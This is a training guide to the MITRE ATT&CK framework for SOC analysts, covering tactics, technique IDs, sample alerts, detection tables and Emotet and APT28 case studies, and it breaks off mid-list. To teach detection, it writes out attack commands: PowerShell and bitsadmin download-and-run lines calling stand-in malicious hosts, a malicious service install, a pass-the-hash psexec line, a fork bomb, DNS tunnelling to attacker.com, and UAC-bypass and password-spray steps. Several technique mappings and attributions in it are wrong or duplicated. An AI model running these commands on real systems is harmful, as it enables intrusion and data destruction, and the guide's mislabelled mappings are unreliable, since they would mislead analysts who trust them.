# MITRE ATT&CK Framework: Comprehensive Guide for SOC Analysts

## Table of Contents
1. [Introduction to MITRE ATT&CK](#introduction)
2. [Framework Structure](#framework-structure)
3. [The 14 Tactics](#tactics)
4. [Common Techniques and Sub-Techniques](#techniques)
5. [Practical SOC Scenarios](#practical-scenarios)
6. [Detection Methods](#detection-methods)
7. [Real-World Examples](#real-world-examples)
8. [Tools Integration](#tools-integration)

---

## Introduction to MITRE ATT&CK

MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.

### Why It Matters for SOC L1 Analysts:
- **Standardized Language**: Common vocabulary for discussing cyber threats
- **Alert Triage**: Helps classify and understand security alerts
- **Threat Intelligence**: Maps indicators to known attack patterns
- **Defense Planning**: Guides detection and prevention strategies

### Key Statistics:
- 14 Tactics across the attack lifecycle
- 800+ Techniques and sub-techniques
- 11+ threat groups tracked and mapped
- Continuously updated with new attack patterns

---

## Framework Structure

### Attack Chain Model
```
Initial Access → Execution → Persistence → Privilege Escalation → 
Defense Evasion → Credential Access → Discovery → Lateral Movement → 
Collection → Command & Control → Exfiltration → Impact
```

### Three Core Domains:
1. **Enterprise** - Windows, Linux, macOS, cloud platforms
2. **Mobile** - iOS and Android
3. **ICS** - Industrial Control Systems

---

## The 14 Tactics Explained

### 1. RECONNAISSANCE (TA0043)

**Definition**: Adversary is gathering information about targets before launching attacks.

**Common Techniques**:
- **T1592: Gather Victim Host Information**
  - Sub-technique: T1592.001 - Hardware
  - Sub-technique: T1592.002 - Software
  - Sub-technique: T1592.003 - Firmware
  - Sub-technique: T1592.004 - Client Configurations

- **T1589: Gather Victim Identity Information**
  - Email addresses, names, phone numbers from public sources

- **T1598: Phishing for Information**
  - Malicious links in emails to gather victim information

- **T1597: Search Open Websites/Domains**
  - OSINT on target organization

**SOC Detection Example**:
Alert: Multiple failed login attempts from reconnaissance IP addresses targeting employee directories.
Response: Check if IP is known C2 infrastructure, block if confirmed.

---

### 2. INITIAL ACCESS (TA0001)

**Definition**: Techniques used to gain first foothold in target environment.

**Common Techniques**:

- **T1189: Drive-by Download**
  - User visits website, malware downloads without user interaction
  - Example: Visiting compromised website downloads banking trojan

- **T1190: Exploit Public-Facing Application**
  - CVE-2021-44228 (Log4Shell) - Remote Code Execution
  - CVE-2021-27065 - Microsoft Exchange Server RCE
  - Detection: Monitor web application logs for unusual patterns, error messages

- **T1199: Trusted Relationship**
  - Compromise third-party vendor to gain access to target
  - Example: SolarWinds supply chain attack (2020)
  - Detection: Monitor vendor access logs, third-party VPN connections

- **T1566: Phishing**
  - T1566.001 - Phishing: Attachment (malicious file in email)
  - T1566.002 - Phishing: Link (malicious URL)
  - T1566.003 - Spearphishing: Link

**Real Scenario**:
```
ALERT DETAILS:
- Email from "apple-security@appul-com.click" to employee
- Subject: "Urgent: Verify Your Account"
- Attachment: Invoice_2024.exe (masquerading as PDF)
- Link: hxxps://apple-security-verify.com/login.php

SOC L1 RESPONSE:
1. Check sender email domain (typosquatting)
2. Verify if attachment is legitimate using VirusTotal
3. Check email header for SPF/DKIM/DMARC failures
4. If suspicious, block sender domain, quarantine emails
5. Alert user about phishing attempt
```

---

### 3. EXECUTION (TA0002)

**Definition**: Techniques that result in running adversary-controlled code.

**Common Techniques**:

- **T1059: Command and Scripting Interpreter**
  - T1059.001 - PowerShell (Windows)
  - T1059.003 - Windows Command Shell (cmd.exe)
  - T1059.004 - Unix Shell (bash, sh)

**Example Alert**:
```
POWERSHELL EXECUTION:
Process: powershell.exe
Command: "IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')"
User: Standard User
Time: 03:45 AM

ANALYSIS:
- IEX = Invoke-Expression (execute code from string)
- Downloading from external URL at odd hour
- Standard user shouldn't run such commands
- HIGH SEVERITY ALERT
```

- **T1204: User Execution**
  - T1204.001 - Malicious Link
  - T1204.002 - Malicious File

- **T1559: Inter-Process Communication**
  - T1559.001 - COM and OLE
  - T1559.002 - Dynamic Data Exchange (DDE)

**Detection Strategy**:
```
COMMAND LINE MONITORING:
1. Monitor for obfuscated PowerShell scripts
2. Watch for Base64 encoded commands
3. Alert on suspicious download patterns
4. Flag unusual execution times (3 AM downloads)
5. Monitor file extensions (.ps1, .vbs, .bat)
```

---

### 4. PERSISTENCE (TA0003)

**Definition**: Techniques to maintain access even if system reboots or user logs off.

**Common Techniques**:

- **T1547: Boot or Logon Autostart Execution**
  - T1547.001 - Registry Run Keys / Startup Folder
  - Malware adds entry to Windows Registry:
    ```
    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
    "Svchost" = "C:\Users\Public\svchost.exe"
    ```
  - Detection: Monitor registry modifications, compare against baseline

- **T1547.004 - Winlogon Helper DLL**
  - Registry: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
  - Attacker adds malicious DLL to run on login

- **T1547.006 - Kernel Modules and Extensions**
  - Rootkit installation on Linux/macOS

- **T1543: Create or Modify System Process**
  - T1543.003 - Windows Service
  - Attacker creates persistent Windows service
  ```
  Example:
  sc create MalwareService binPath= "C:\Malware\payload.exe"
  sc start MalwareService
  ```

- **T1037: Boot or Logon Initialization Scripts**
  - /etc/rc.d/ on Linux
  - /Library/LaunchDaemons/ on macOS

**SOC Detection Example**:
```
ALERT: New Service Created
Service Name: Windows10 Update Service
Display Name: Windows10Update
Binary Path: C:\ProgramData\update\svc.exe
Start Type: Auto (Automatic)
User: SYSTEM

INVESTIGATION:
1. Legitimate Windows services start with "Windows" prefix rarely
2. Check if binary exists and is signed by Microsoft
3. Check event ID 7045 (Windows service installation)
4. If unauthorized, stop service: sc stop servicename
5. Delete service: sc delete servicename
```

---

### 5. PRIVILEGE ESCALATION (TA0004)

**Definition**: Techniques to gain higher-level permissions/access.

**Common Techniques**:

- **T1548: Abuse Elevation Control Mechanism**
  - T1548.002 - Bypass User Access Control (UAC)
  - Windows UAC can be bypassed using various methods
  
**Real Example - UAC Bypass**:
```
TECHNIQUE: fodhelper.exe Registry Hijacking
Process Tree:
- explorer.exe (user process)
  └─ fodhelper.exe (with elevated privileges)

HOW IT WORKS:
1. Create registry key: HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command
2. Set value to malware executable path
3. Run fodhelper.exe - it looks up registry and runs our malware elevated
4. No UAC prompt appears

DETECTION:
- Monitor registry modifications under ms-settings\
- Watch for fodhelper.exe spawning unusual child processes
- Check for registry run keys pointing to non-standard paths
```

- **T1134: Access Token Manipulation**
  - T1134.001 - Token Impersonation or Theft
  - Attacker steals token from running process
  - Allows impersonation without knowing password
  
**Token Impersonation Attack**:
```
SCENARIO: Attacker runs meterpreter as low-privilege user
1. List available tokens: tokens.exe
2. Impersonate LOCAL SYSTEM: impersonate_token "NT AUTHORITY\SYSTEM"
3. Execute commands as SYSTEM with full privileges
4. Deploy persistence mechanism (service, registry, etc.)

DETECTION:
- Monitor process creation with mismatched user context
- Watch for token impersonation events (Event ID 4627)
- Alert on SYSTEM-level actions from user processes
```

- **T1547.001 - Registry Run Keys**
  - Add malware to Registry Run keys for persistence + privilege escalation

- **T1199 - Trusted Relationship Exploitation**
  - Use vendor access to escalate privileges

---

### 6. DEFENSE EVASION (TA0005)

**Definition**: Techniques to avoid detection and evade defenses.

**Common Techniques**:

- **T1197: BITS Jobs**
  - Background Intelligent Transfer Service (BITS)
  - Legitimate file transfer mechanism abused for stealth downloads
  ```
  EXAMPLE USAGE:
  bitsadmin /create /name "Download" /resume
  bitsadmin /addfile "Download" "http://malicious.com/payload.exe" "C:\temp\payload.exe"
  bitsadmin /resume "Download"
  
  WHY DANGEROUS:
  - Runs with user privileges
  - Creates minimal network noise
  - Not logged by default in older Windows versions
  - Can resume transfers even after reboot
  ```

- **T1140: Deobfuscate/Decode Files or Information**
  - Malware uses encoding to hide true payload
  ```
  EXAMPLE:
  Original: IEX(New-Object Net.WebClient).DownloadString('http://c2.com/payload')
  Encoded: aUV4KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jMi5jb20vcGF5bG9hZCcp
  
  Detection: Decode and inspect base64 strings in logs
  ```

- **T1564: Hide Artifacts**
  - T1564.001 - Hidden Files and Directories
  ```
  Linux: mv malware .malware (dot prefix hides file)
  Windows: attrib +h file.exe (hidden attribute)
  ```

- **T1036: Masquerading**
  - Disguise process/file as legitimate
  ```
  EXAMPLE:
  Malware named: svchost.exe (looks like Windows service host)
  Located: C:\Users\Public\ (suspicious location)
  Real svchost.exe: C:\Windows\System32\
  
  Detection: Compare file paths and file signatures
  ```

- **T1556: Modify Authentication Process**
  - T1556.006 - Multi-Factor Authentication Interception
  - Intercept MFA codes during login

- **T1036.005 - Match Legitimate Name or Location**
  - Create malware with legitimate Windows filename in wrong directory

---

### 7. CREDENTIAL ACCESS (TA0006)

**Definition**: Techniques to steal credentials from users/systems.

**Common Techniques**:

- **T1110: Brute Force**
  - T1110.001 - Password Guessing
  - T1110.002 - Password Spraying
  
**Password Spray Attack**:
```
SCENARIO: Attacker has company email list (from LinkedIn, previous breach)
Target: Azure AD login portal (login.microsoftonline.com)

ATTACK:
1. Get list: user1@company.com, user2@company.com, ...
2. Try common passwords: Password123!, Company123!, Welcome@2024
3. Don't lock accounts: Use multiple attempts with throttling
4. Target off-hours when MFA might be disabled

DETECTION:
Alert: Multiple failed login attempts across different users
- 50+ failed logins in 10 minutes
- Different usernames, same IP
- Same password pattern attempts
- Time: 2 AM (after hours)

SOC RESPONSE:
1. Block IP immediately
2. Check if any attempts succeeded (check for successful login after failures)
3. Force password reset for users in spray pattern
4. Check MFA logs for circumvention attempts
```

- **T1187: Forced Authentication**
  - Trick user into authenticating to attacker-controlled server
  ```
  EXAMPLE: NTLM Relay Attack
  1. Attacker creates malicious network share
  2. User tries to access share
  3. Share requests NTLM authentication
  4. Attacker relays credentials to legitimate service
  5. Attacker gains authenticated access
  
  Detection: Monitor failed authentication attempts from internal IPs
  ```

- **T1056: Input Capture**
  - T1056.001 - Keylogging (capture keyboard input)
  - T1056.004 - Credential API Hooking
  
**Keylogger Detection**:
```
SCENARIO: Banking trojan with keylogger component
Process: explorer.exe → malware.exe → hook into browser

DETECTION INDICATORS:
1. Unusual DLL injection into browser process
2. Keyboard hooking API calls (SetWindowsHookEx)
3. File operations in %APPDATA% (logs directory)
4. Network connections to C2 at regular intervals
5. Elevated system privileges for user-level process

SOC ACTION:
- Isolate machine immediately
- Check browser history for finance sites
- Review any transactions from associated accounts
- Preserve memory dump for malware analysis
```

- **T1555: Credentials from Password Managers**
  - Extract password database from browser/app
  - Chrome/Firefox stored passwords
  - LastPass, 1Password vaults

- **T1056.002 - GUI Input Capture**
  - Screenshot capture before sending to C2

---

### 8. DISCOVERY (TA0007)

**Definition**: Techniques to explore and understand target environment.

**Common Techniques**:

- **T1087: Account Discovery**
  ```
  COMMAND: net user /domain (Windows domain environment)
  OUTPUT: Lists all user accounts in domain
  
  DETECTION: Monitor successful execution of account enumeration commands
  ```

- **T1580: Cloud Infrastructure Discovery**
  - Enumerate cloud resources, buckets, instances
  ```
  AWS Example:
  aws s3 ls (list all S3 buckets - if credentials compromised)
  aws ec2 describe-instances (list all running instances)
  
  DETECTION: Monitor CloudTrail logs for unusual API calls
  ```

- **T1526: Cloud Service Discovery**
  - Identify running cloud services (AWS, Azure, GCP)

- **T1538: SaaS Enumeration**
  - Map out connected SaaS applications
  - Office 365, Salesforce, etc.

- **T1526: Cloud Infrastructure Discovery**

**SOC Scenario - Discovery Activity**:
```
SUSPICIOUS ACTIVITY DETECTED:
User: john.doe@company.com
Activity Timeline:
- 10:15 AM: Login from unusual location (India, normally UK)
- 10:16 AM: Executed "net group /domain"
- 10:18 AM: Executed "net group Domain\ Admins"
- 10:20 AM: Accessed admin share: \\dc1\admin$
- 10:22 AM: Listed files in C:\Program Files
- 10:25 AM: Connected to database server

ANALYSIS:
1. Attacker exploring domain structure
2. Looking for admin accounts and systems
3. Planning lateral movement
4. HIGH SEVERITY INCIDENT

RESPONSE:
1. Force password reset
2. Review all actions for 24 hours prior
3. Check what files were accessed
4. Revoke all active sessions
5. Enable enhanced monitoring on account
```

---

### 9. LATERAL MOVEMENT (TA0008)

**Definition**: Techniques to move deeper into network after initial access.

**Common Techniques**:

- **T1021: Remote Services**
  - T1021.001 - Remote Desktop Protocol (RDP)
  - T1021.002 - SSH
  - T1021.006 - Windows Remote Management (WinRM)
  
**RDP Lateral Movement Attack**:
```
SCENARIO: Attacker compromised user workstation
1. Attacker finds credentials (plaintext in memory, LSASS dump, registry)
2. Uses RDP to connect to server: mstsc.exe /v:server.company.local /u:Administrator
3. Enters stolen credentials
4. Gains access to production server
5. Installs persistence mechanism

DETECTION:
- Monitor RDP login events (Event ID 4624 - Logon Type 10)
- Alert on successful RDP from unusual source IPs
- Watch for RDP connections during off-hours
- Monitor failed RDP attempts to admin accounts
- Alert on RDP to multiple servers in short time

EXAMPLE ALERT:
Event ID 4624 - Successful Network Logon
- User: Administrator
- Source IP: 192.168.1.100 (compromised workstation)
- Logon Type: 10 (RDP)
- Time: 3:45 AM (suspicious hour)
- Destination: db-server.company.local
```

- **T1570: Lateral Tool Transfer**
  - Copy tools to remote system before execution
  - Move hacking tools via PSEXEC, SCP, RDP

- **T1550: Use Alternate Authentication Material**
  - T1550.002 - Pass the Hash (Windows NTLM)
  - T1550.003 - Pass the Ticket (Kerberos)
  
**Pass the Hash Attack**:
```
SCENARIO: Attacker dumped NTLM hashes from compromised server
Hash: admin:8846f7eaee8fb117ad06bdd830b7586c

ATTACK:
1. Use tool like Mimikatz to extract hashes
2. Use psexec/wmiexec with hash (no password needed):
   psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c admin@server.local
3. Execute commands as administrator on target

DETECTION:
- Monitor for LSASS dumping (Event ID 4688 - Process Creation)
- Watch for unusual Kerberos/NTLM authentications
- Alert on failed attempts with password but successful with hash
- Monitor Mimikatz execution or similar credential dumping tools
```

---

### 10. COLLECTION (TA0009)

**Definition**: Techniques to gather data from target system/network.

**Common Techniques**:

- **T1123: Audio Capture**
  - Malware activates microphone without user knowledge

- **T1115: Clipboard Data**
  - Steal copied data (passwords, credit cards, sensitive text)
  ```
  EXAMPLE: User copies password from password manager
  Malware reads clipboard and exfiltrates it
  ```

- **T1530: Data from Cloud Storage**
  - Access OneDrive, Google Drive, Dropbox

- **T1005: Data from Local System**
  - Collect files from compromised computer
  ```
  DETECTION:
  - Monitor file access patterns, especially sensitive files
  - Alert on bulk file copying to suspicious location
  - Watch for archive/compression of multiple files (.zip, .rar)
  ```

- **T1025: Data from Removable Media**
  - Copy data to USB drive

**Practical Scenario - Insider Threat**:
```
ALERT: Bulk Data Exfiltration Detected

Details:
- User: sarah.smith@company.com
- Action: Copied 500+ files to Desktop\Archive folder
- Files: Customer records, contract PDFs, financial data
- Size: 2.3 GB
- Time: 5:45 PM (after hours)
- Destination: External USB drive (D:\)

DETECTION METHOD:
- DLP (Data Loss Prevention) alert on sensitive file types
- File access logs show bulk read operations
- USB device detection logs

SOC INVESTIGATION:
1. Check if employee is leaving company (resignation submitted?)
2. Review file types copied (customers, contracts, financials = HIGH RISK)
3. Check recent email communications
4. Monitor if any data has been uploaded to external cloud
5. Check if printed any sensitive documents

ESCALATION: Refer to HR and Legal department
IMMEDIATE ACTION: Disable account, revoke USB access, analyze removed data
```

- **T1557: Man-in-the-Middle**
  - T1557.002 - ARP Spoofing (local network only)

- **T1185: Traffic Mirroring**
  - Attacker with network access mirrors traffic to analyze

---

### 11. COMMAND AND CONTROL (TA0011)

**Definition**: Techniques for attacker to communicate with compromised systems.

**Common Techniques**:

- **T1071: Application Layer Protocol**
  - T1071.001 - HTTP/HTTPS (most common, blends with normal traffic)
  - T1071.002 - DNS
  - T1071.004 - DNS over HTTPS (DoH)
  
**C2 Communication Example**:
```
SCENARIO: Malware "Emotet" using HTTP C2
1. Compromised system connects to C2 server
2. POST request to random URI: /component/ajax.php?v=xxxxx
3. Sends encrypted payload with system information
4. Receives command (steal credentials, download more malware, etc.)
5. Executes command and sends results back

NETWORK INDICATORS:
- Destination IP: 1.2.3.4 (known C2 infrastructure)
- Port: 8080 (unusual for HTTP)
- Frequency: Every 5 minutes (regular callback)
- Data: Encrypted payload (encrypted-looking requests)
- User Agent: Odd string or missing

DETECTION:
- Monitor outbound HTTPS/HTTP to suspicious domains
- Alert on regular connection patterns (C2 beacons)
- Check against threat intelligence feeds
- Monitor DNS queries for known C2 domains
```

- **T1008: Fallback Channels**
  - Malware uses alternate C2 if primary fails
  - Example: HTTP → DNS → HTTPS fallback chain

- **T1105: Ingress Tool Transfer**
  - Download additional tools and malware from C2

- **T1571: Non-Standard Port**
  - C2 communication on unusual ports to evade firewalls

**Detection Strategy**:
```
OUTBOUND TRAFFIC MONITORING:
1. Whitelist known legitimate domains
2. Flag all other HTTPS/HTTP outbound (HTTP is completely uncommon in modern apps)
3. Alert on connections to:
   - Dynamic DNS services
   - VPN/Proxy services
   - Tor exit nodes
   - Known C2 infrastructure (from threat feeds)
4. Monitor DNS queries for:
   - DGA (Domain Generation Algorithm) patterns
   - Unusually long subdomains
   - High-entropy domain names
   - Queries to newly registered domains
```

---

### 12. EXFILTRATION (TA0010)

**Definition**: Stealing data from target environment.

**Common Techniques**:

- **T1020: Automated Exfiltration**
  - Malware automatically exfiltrates data at regular intervals

- **T1030: Data Transfer Size Limits**
  - Send data in chunks to avoid detection
  - Example: 10 MB chunks every hour instead of 1 GB at once

- **T1048: Exfiltration Over Alternative Protocol**
  - T1048.001 - Exfiltration Over Symmetric Encrypted Non-C2 Protocol
  - T1048.002 - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol
  - T1048.003 - Exfiltration Over Unencrypted Non-C2 Protocol
  
**Exfiltration Techniques**:
```
EXAMPLE 1: DNS Tunneling
Data: Sensitive document
Technique: Chunk data into DNS queries
Example queries:
- xxx123456789.attacker.com (123456789 = encoded data)
- yyy987654321.attacker.com
- zzz555444333.attacker.com

Advantages: Bypasses firewall rules (DNS typically allowed)
Detection: Monitor DNS query sizes and frequency, look for high-entropy subdomains

EXAMPLE 2: HTTPS Exfiltration
Data: Encrypted and chunked
Method: POST requests to legitimate-looking HTTPS endpoint
Detection: Monitor HTTPS traffic volume, inspect encrypted traffic if possible

EXAMPLE 3: Email Exfiltration
Method: Malware sends emails from compromised account
Detection: Monitor email sender reputation, check for unusual email patterns
```

---

### 13. IMPACT (TA0040)

**Definition**: Techniques to disrupt systems and operations.

**Common Techniques**:

- **T1531: Account Access Removal**
  - Lock out users from accounts
  - Delete accounts (destructive)

- **T1561: Disk Wipe**
  - Overwrite disk sectors to destroy data
  - Example: DBAN (Darik's Boot and Nuke)

- **T1561: Disk Wipe**
  - Delete critical files to disrupt operations

- **T1499: Endpoint Denial of Service**
  - T1499.001 - OS Exhaustion Flood
  - Consume system resources (CPU, memory, disk)
  ```
  EXAMPLE: Fork bomb on Linux
  :(){ :|:& };:
  This recursively spawns processes until system crashes
  ```

- **T1561: Data Destruction**
  - Example: Ransomware that overwrites files with encryption

**Ransomware Impact Attack**:
```
SCENARIO: Ransomware Deployment (WannaCry)

TIMELINE:
- Malware exploits vulnerability (T1190: Exploit Public-Facing Application)
- Spreads laterally (T1021: Remote Services)
- Executes ransomware payload (T1204: User Execution)
- Encrypts all accessible files
- Displays ransom note

FILE PATTERN:
Original: document.docx
Encrypted: document.docx.WNCRY

IMPACT:
- Business operations disrupted
- Backups potentially compromised
- Data unavailable for recovery

DETECTION:
1. Monitor file extension changes
2. Alert on large number of file modifications
3. Monitor C2 communication before encryption
4. Alert on unusual file system activity
5. Check for shadow copy deletion (attacker removes recovery option)

RESPONSE:
1. Disconnect affected systems from network immediately
2. Preserve logs and memory dump
3. Check backup integrity
4. Assess scope of compromise
5. Restore from clean backups
```

---

## Practical SOC Scenarios

### Scenario 1: Phishing Email with Credential Stealer

```
ALERT RECEIVED:
Multiple users reporting suspicious emails

INVESTIGATION STEPS:

Step 1: Email Header Analysis
- From: noreply@bankof-america.com (typosquatting domain)
- To: 15 employees (finance, HR, IT)
- Subject: Urgent: Verify Your Banking Details
- Links: hxxps://bankof-america-verify.pw/login

Step 2: Check Threat Intelligence
- Domain bankof-america.pw registered 2 days ago
- IP resolved: 12.34.56.78 (known phishing hosting)
- URL on VirusTotal: 45 vendors flag as phishing

Step 3: Check Email Gateway Logs
- Email bypassed SPF check (SPF hard fail)
- DKIM signature forged
- DMARC: None (not enforced)
- Came from external IP: 185.220.101.xxx (Tor exit node)

Step 4: SOC Response
- Block sender domain and IP
- Quarantine emails with similar attributes
- Send user awareness email
- Check if any employees clicked link
- Review web proxy logs for clicks to phishing URL

Step 5: Escalation
- Check if any password changes occurred after email
- Reset passwords for employees who clicked
- Enable MFA for affected accounts

TECHNIQUES INVOLVED:
- T1566.001: Phishing with attachment
- T1598: Phishing for Information
- T1589: Gather Victim Identity Information
- T1555: Credentials from Password Managers (if user enters creds)
```

### Scenario 2: Suspicious Process Execution

```
ALERT FROM EDR (Endpoint Detection and Response):

Alert ID: 12847
Machine: SALES-01.company.local
Time: 2024-01-15 03:47:23 UTC
Severity: Critical

EVENT DETAILS:
Parent Process: explorer.exe (user: jessica.wang)
Child Process: powershell.exe
Command Line: "powershell.exe" -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.102.xxx/beacon')"

IMMEDIATE ANALYSIS:

Red Flags Identified:
1. PowerShell with -nop (no profile)
2. -w hidden (hidden window)
3. IEX (Invoke-Expression - execute code)
4. DownloadString from external IP
5. Time: 3:47 AM (unusual hour)
6. Source IP 185.220.102.xxx is known C2 infrastructure

MITRE Mapping:
- T1059.001: Command and Scripting Interpreter (PowerShell)
- T1071.001: Application Layer Protocol (HTTP download)
- T1105: Ingress Tool Transfer
- T1204: User Execution (user might have triggered indirectly)

FORENSICS STEPS:

1. Check Process Tree:
   - explorer.exe spawned powershell.exe
   - Any DLL injections in explorer.exe?
   - Was explorer.exe compromised?

2. Check User Activity:
   - Was jessica.wang at desk at 3:47 AM?
   - Remote login from unusual location?
   - Any recent phishing emails to this user?

3. Check File System:
   - Persistence mechanisms (Registry Run keys, Scheduled Tasks)?
   - New files created in AppData, Temp, Downloads?
   - Malware samples on disk?

4. Check Network:
   - Is malware still connecting to C2?
   - Are other systems connecting to same C2?
   - Lateral movement indicators?

INCIDENT RESPONSE:

Immediate Actions:
1. Isolate machine from network (preserve evidence)
2. Block destination IP at firewall
3. Memory dump for later analysis
4. Preserve hard drive image
5. Force password reset for jessica.wang
6. Revoke active sessions

Investigation:
1. Analyze downloaded beacon binary
2. Check for lateral movement attempts
3. Review email/files accessed
4. Check browser history for phishing clicks
5. Interview jessica.wang about unusual activity

Remediation:
1. Wipe and rebuild machine
2. Change domain credentials
3. Scan all machines for similar indicators
4. Review logs for C2 callback patterns
5. Enhanced monitoring on user account
```

### Scenario 3: Lateral Movement Detection

```
INCIDENT: Lateral Movement Detected

ALERT SEQUENCE (30 minute window):

10:15 AM - Initial Access:
Machine: RECEPTION-02
Alert: Unusual PowerShell execution
Process: explorer.exe → powershell.exe
Action: Downloaded and executed suspicious script

10:18 AM - Credential Theft:
Alert: LSASS.exe accessed by suspicious process
Process: powershell.exe → lsass.exe
Technique: T1110 - Credential Dumping (Mimikatz-like)
Result: NTLM hashes extracted from memory

10:22 AM - Lateral Movement Attempt 1:
Alert: Remote Service Connection
Source: RECEPTION-02
Destination: FILE-SERVER-01.company.local (RDP - Port 3389)
User: Extracted admin credentials
Status: SUCCESSFUL LOGIN

10:25 AM - Persistence on File Server:
Alert: Service Creation
Service Name: "Windows System Update Service"
Binary Path: C:\ProgramData\svchost.exe
User: SYSTEM
Technique: T1543.003 - Windows Service Creation

10:27 AM - Discovery on File Server:
Alert: Account Enumeration
Command: net group /domain
Command: net group "Domain Admins"
Purpose: Mapping domain structure for further lateral movement

10:30 AM - Lateral Movement Attempt 2:
Alert: RDP Connection
Source: FILE-SERVER-01
Destination: DB-SERVER-01.company.local
User: Administrator (stolen credentials)
Status: SUCCESSFUL

COMPLETE ATTACK CHAIN:

Initial Access (Reception user infected)
         ↓
Execution (PowerShell malware)
         ↓
Credential Access (Mimikatz credential dump)
         ↓
Privilege Escalation (Extracted admin hashes)
         ↓
Persistence (Service creation)
         ↓
Discovery (Enumerate domain)
         ↓
Lateral Movement (RDP to file server)
         ↓
Lateral Movement (RDP to database)
         ↓
Collection (Access to sensitive databases?)

IMMEDIATE RESPONSE:

1. Isolate all affected systems from network
2. Block all RDP connections between systems
3. Kill all PowerShell processes
4. Disable compromised accounts
5. Revoke all sessions

6. FORENSICS:
   - Check what data was accessed on file/db servers
   - Analyze malware payload
   - Look for data exfiltration indicators
   - Check backup integrity

7. CONTAINMENT:
   - Reset all admin credentials
   - Rebuild compromised systems
   - Deploy EDR to all systems
   - Implement network segmentation
   - Enable MFA for remote access
```

---

## Detection Methods by Tactic

### Detection Strategy Matrix

```
TACTIC              | LOG SOURCE           | KEY INDICATORS
-------------------|----------------------|----------------------------------
Reconnaissance      | Firewall logs        | Port scans, DNS enumeration
                    | DNS logs             | Unusual domain queries
                    | IDS/IPS alerts       | Nmap, Shodan-like activity

Initial Access      | Email gateway        | Phishing, malicious attachments
                    | Web logs             | Exploit attempts, suspicious uploads
                    | Firewall logs        | Unusual inbound connections

Execution           | Process logs (Sysmon)| Unsigned binaries, script execution
                    | EDR alerts           | Memory injection, DLL loading
                    | Command line audit   | Obfuscated commands, IEX/Invoke-Expression

Persistence         | Registry audit       | Run keys, startup folders
                    | Sysmon logs          | Service creation, driver installation
                    | File integrity       | Unexpected file modifications

Privilege Esc.      | Process creation     | Unusual privilege elevation
                    | Token audit          | Token impersonation events
                    | Registry changes     | UAC bypass indicators

Defense Evasion     | File hashes          | Code signing anomalies
                    | Process behavior     | Parent-child process mismatches
                    | Registry audit       | AMSI bypasses, signature evasion

Credential Access   | Authentication logs  | Failed login spikes, unusual hours
                    | LSASS audit         | Credential dumping attempts
                    | File access logs    | Password file access

Discovery           | Process creation     | Net.exe, Enum tools execution
                    | File access logs    | Unusual file/directory enumeration
                    | Network audit       | Network reconnaissance tools

Lateral Movement    | Authentication logs  | Successful logins from new IPs
                    | Network traffic     | RDP/SSH to unusual destinations
                    | Process creation    | Remote process execution

Collection          | File access logs    | Bulk file access/copying
                    | Clipboard audit     | Sensitive data clipboard operations
                    | Network traffic     | Archive file transfers

Command & Control   | DNS logs            | C2 domain resolution
                    | Network traffic     | Beacon-like traffic patterns
                    | Firewall logs       | Connections to suspicious IPs

Exfiltration        | Network traffic     | Data transfer to external IPs
                    | DLP alerts          | Sensitive data leaving network
                    | DNS audit           | DNS tunneling patterns

Impact              | File integrity      | Unexpected file modifications
                    | System audit        | Critical file deletions
                    | Backup logs         | Shadow copy deletion
```

---

## Real-World Examples Mapped to MITRE ATT&CK

### Example 1: Emotet Banking Trojan

**Timeline**: First discovered 2014, actively used through 2021

**Attack Chain**:
```
1. INITIAL ACCESS (T1566.001)
   → Phishing email with malicious macro in Word document
   → Filename: Invoice_January_2024.docm

2. EXECUTION (T1059.003, T1203)
   → Macro enables and executes VBScript
   → Downloads Emotet DLL from attacker-controlled server

3. PERSISTENCE (T1547.001)
   → Adds registry run key: HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
   → Value: "WindowsUpdate" = "C:\Users\Public\emotet.exe"

4. DEFENSE EVASION (T1140, T1036)
   → Emotet DLL is encrypted
   → Emotet.exe appears as legitimate system file
   → Disables Windows Defender with registry modifications

5. CREDENTIAL ACCESS (T1555)
   → Extracts saved passwords from browsers
   → Dumps NTLM hashes from LSASS
   → Steals email credentials for spam module

6. COMMAND AND CONTROL (T1071.001)
   → HTTPS connections to C2 servers
   → Uses legitimate-looking HTTP POST requests
   → Encrypted command payloads

7. LATERAL MOVEMENT (T1570)
   → Uses PSEXEC to move to other systems
   → Leverages stolen credentials for RDP access

8. EXFILTRATION (T1020)
   → Automatically exfiltrates banking credentials
   → Sends stolen email credentials to C2

IMPACT:
- Banking credentials stolen
- Ransomware deployed as secondary payload
- Spam module sends millions of emails
- Lateral movement to corporate network
```

**Detection Indicators**:
```
NETWORK:
- C2 domains: emotet.ru, emotet.com (various, constantly changing)
- Unusual HTTPS traffic to unknown IPs
- Regular HTTP POST to suspicious endpoints

SYSTEM:
- Emotet.exe in non-standard location
- Registry modifications to disable Windows Defender
- LSASS dumping attempts
- Unusual DLL loads in explorer.exe

BEHAVIORAL:
- Phishing emails with macro attachments
- Multiple failed login attempts (credential spraying)
- Outbound connections to known C2 infrastructure
- Spam from internal email account
```

### Example 2: APT28 (Fancy Bear) - Advanced Persistent Threat

**Attribution**: Russian GRU military intelligence

**Target**: Government organizations, military, defense contractors

**Attack Chain**:
```
1. RECONNAISSANCE (TA0043, T1598)
   → Spear-phishing for information
   → Research targets using OSINT
   → Send crafted phishing emails with legitimate-looking links

2. INITIAL ACCESS (T1566.002)
   → Phishing link to credential harvesting page
   → Page spoofs Office 365 login
   → Captures username and password

3. EXECUTION (T1059.001)
   → PowerShell-based backdoor (PowerDuke)
   → Downloaded and executed from C2

4. PERSISTENCE (T1547.001, T1547.011)
   → Registry run keys for backdoor
   → Scheduled tasks for command execution
   → DLL side-loading for stealth

5. PRIVILEGE ESCALATION (T1548.002, T1134.001)
   → UAC bypass techniques
   → Token impersonation for system access

6. DEFENSE EVASION (T1036.005, T1562.008)
   → Masquerade as Windows processes
   → Disable event logging
   → Use encrypted communications

7. CREDENTIAL ACCESS (T1110.003, T1187)
   → Brute force attacks on external portals
